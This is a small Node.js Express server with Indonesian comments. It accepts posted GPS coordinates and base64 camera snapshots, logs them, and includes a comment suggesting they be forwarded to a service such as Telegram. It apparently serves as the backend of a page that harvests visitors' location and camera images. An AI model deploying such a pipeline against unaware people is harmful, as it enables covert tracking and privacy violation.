const express = require("express");
const app = express();

app.use(express.json({ limit: "20mb" }));
app.use(express.static("public"));

// 📍 terima lokasi
app.post("/location", (req, res) => {
  const { lat, lon, acc } = req.body;
  console.log("LOCATION:", lat, lon, acc);

  // 👉 di sini kamu bisa teruskan ke layanan lain (mis. Telegram)
  res.json({ ok: true });
});

// 📷 terima gambar
app.post("/camsnap", (req, res) => {
  const { image } = req.body;
  console.log("IMAGE received (base64 length):", image?.length);

  // 👉 di sini kamu bisa simpan / forward ke layanan lain
  res.json({ ok: true });
});

app.get("/health", (req, res) => res.send("OK"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server running on", PORT));
